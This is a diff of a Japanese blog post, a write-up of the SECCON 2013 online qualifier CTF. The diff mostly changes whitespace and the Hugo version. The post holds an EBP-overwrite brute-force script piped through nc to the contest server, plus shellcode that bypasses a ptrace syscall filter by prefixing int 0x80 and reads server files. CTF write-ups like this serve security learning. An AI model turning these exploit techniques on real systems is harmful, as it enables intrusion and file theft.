@@ -5,17 +5,13 @@
     <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="generator" content="Hugo 0.59.1 with theme Tranquilpeak 0.4.7-BETA">
+<meta name="generator" content="Hugo 0.61.0 with theme Tranquilpeak 0.4.7-BETA">
 <meta name="author" content="Kazutoshi Noguchi">
 <meta name="keywords" content="">
 <meta name="description" content="SECCON オンライン予選にチーム0x0のメンバーとして参加しました。
-
 3700点で7位でした。
-
 bin500に時間をかけ過ぎた結果、練習問題とbin200しか解けなかった。
-
 バイナリ問題以外も見ておけばよかった
-
 
 
  
@@ -41,13 +37,9 @@ bin500に時間をかけ過ぎた結果、練習問題とbin200しか解けな�
 
 
 <meta property="og:description" content="SECCON オンライン予選にチーム0x0のメンバーとして参加しました。
-
 3700点で7位でした。
-
 bin500に時間をかけ過ぎた結果、練習問題とbin200しか解けなかった。
-
 バイナリ問題以外も見ておけばよかった
-
 
 
  
@@ -77,13 +69,9 @@ bin500に時間をかけ過ぎた結果、練習問題とbin200しか解けな�
 <meta property="twitter:url" content="https://ngkz.github.io/2014/01/seccon-2013-online-quals-writeup/">
 <meta property="og:site_name" content="ngkz.log">
 <meta property="og:description" content="SECCON オンライン予選にチーム0x0のメンバーとして参加しました。
-
 3700点で7位でした。
-
 bin500に時間をかけ過ぎた結果、練習問題とbin200しか解けなかった。
-
 バイナリ問題以外も見ておけばよかった
-
 
 
  
@@ -107,13 +95,9 @@ bin500に時間をかけ過ぎた結果、練習問題とbin200しか解けな�
   
 ">
 <meta name="twitter:description" content="SECCON オンライン予選にチーム0x0のメンバーとして参加しました。
-
 3700点で7位でした。
-
 bin500に時間をかけ過ぎた結果、練習問題とbin200しか解けなかった。
-
 バイナリ問題以外も見ておけばよかった
-
 
 
  
@@ -231,7 +215,7 @@ bin500に時間をかけ過ぎた結果、練習問題とbin200しか解けな�
         </a>
         <h4 class="sidebar-profile-name">Kazutoshi Noguchi</h4>
         
-          <h5 class="sidebar-profile-bio">I&rsquo;m interested in InfoSec, Trip, Electronics, and DIY.</h5>
+          <h5 class="sidebar-profile-bio">I'm interested in InfoSec, Trip, Electronics, and DIY.</h5>
         
       </div>
     
@@ -367,13 +351,9 @@ bin500に時間をかけ過ぎた結果、練習問題とbin200しか解けな�
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
               <p>SECCON オンライン予選にチーム0x0のメンバーとして参加しました。</p>
-
 <p>3700点で7位でした。</p>
-
 <p>bin500に時間をかけ過ぎた結果、練習問題とbin200しか解けなかった。</p>
-
 <p>バイナリ問題以外も見ておけばよかった</p>
-
 
 
  
@@ -397,47 +377,35 @@ bin500に時間をかけ過ぎた結果、練習問題とbin200しか解けな�
   
 </div>
 
-
 <h2 id="exploit-me-bin200">exploit me (bin200)</h2>
-
 <p>EBPの最後の1バイトを上書きできる。</p>
-
 <p>0x8048e80にflagを表示する関数があるのでうまくそこにリターンさせればクリア</p>
-
 <pre><code>import subprocess
  
 for i in range(256):
     subprocess.call(r&quot;&quot;&quot;python -c &quot;import sys,struct; sys.stdout.write(struct.pack('&lt;L', 0x8048e80) * 20
  + '\x%02x')&quot; | nc exploitme.quals.seccon.jp 31337 -v&quot;&quot;&quot; % i, shell=True)
 </code></pre>
-
 <h2 id="hack-this-site-bin500">hack this site (bin500)</h2>
-
 <p>プロセスのメモリダンプと長時間格闘した末、終了2時間前に任意のシステムコールを呼び出す方法に気づいたが、任意のファイルを読み込めるようになったところで時間切れになってしまった。</p>
-
 <p>シェルコードをサーバーに投げると、forkした子プロセス内でptraceを使用してシングルステップ実行される。</p>
-
 <p>シェルコードには以下の制限がある。</p>
-
 <ul>
 <li>最大64byte</li>
 <li>int 0x80、sysenterは親プロセスでエミュレートされる。
-
 <ul>
 <li>stdoutへのwriteは40byteのバッファへの書き込みに置換され、実行後に出力される。</li>
 <li>それ以外のシステムコールは無視される。</li>
 <li>システムコール実行後には子プロセスがkillされる。</li>
 <li>シェルコードが展開される1024byteのバッファの外を実行しようとするとkillされる。</li>
 <li>INT3するとkillされる。</li>
-</ul></li>
 </ul>
-
+</li>
+</ul>
 <p>システムコールへの呼び出しを
 命令の先頭が一致するかどうかでチェックしているので、int
 0x80の前にプレフィックスをつけるとチェックをすり抜けて任意のシステムコールが実行できる。</p>
-
 <p>あとはgetdirentsでファイルのリストを取得</p>
-
 <pre><code>#!/usr/bin/python
 import socket
 import subprocess
@@ -495,9 +463,7 @@ db &quot;.&quot;, 0 ;path
  
 print execute(shellcode_ls, &quot;&quot;)
 </code></pre>
-
 <p>lseekとreadでpwd.zipを読み込む。</p>
-
 <pre><code>wfile = open(&quot;pwd.zip&quot;, &quot;w&quot;)
 readed = 0
 readsize = 0x10400
@@ -549,11 +515,8 @@ eip=\w+, eflags=\w+&quot;&quot;&quot;, result, re.M)
  
 wfile.close()
 </code></pre>
-
 <p>pwd.zipを解凍すると comb,xxx.bin,hint.txtが出てくる。</p>
-
 <p>$ nkf hint.txt</p>
-
 <pre><code>pwd.bmpとpwd.pngは
 フォーマットが違うだけで同じ画像
 
@@ -561,9 +524,7 @@ $ ./comb pwd.bmp pwd.png &gt; xxx.bin
 
 このように実行された
 </code></pre>
-
 <p>combは以下のような動作をするプログラム。</p>
-
 <pre><code>char *file1_buf;
 int file1_size;
 char *file2_buf;
@@ -588,12 +549,9 @@ do {
     if (file2_size &lt; 0) file2_size = 0;
 } while(file1_size + file2_size &gt; 0);
 </code></pre>
-
-<p></p>
-
+<p>\</p>
 <p>xxx.binの更新時間から乱数のseedを、BMPのヘッダからpwd.bmpのファイルサイズを、PNGのフッタとpwd.bmpのファイルサイズから
 pwd.pngのファイルサイズを復元できる。 </p>
-
 <pre><code>#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
  
@@ -638,9 +596,7 @@ int main() {
     return 0;
 }
 </code></pre>
-
 <p>$ xdg-open pwd.png</p>
-
 
 
  
@@ -873,7 +829,7 @@ int main() {
     
     <h4 id="about-card-name">Kazutoshi Noguchi</h4>
     
-      <div id="about-card-bio">I&rsquo;m interested in InfoSec, Trip, Electronics, and DIY.</div>
+      <div id="about-card-bio">I'm interested in InfoSec, Trip, Electronics, and DIY.</div>
     
     
       <div id="about-card-job">
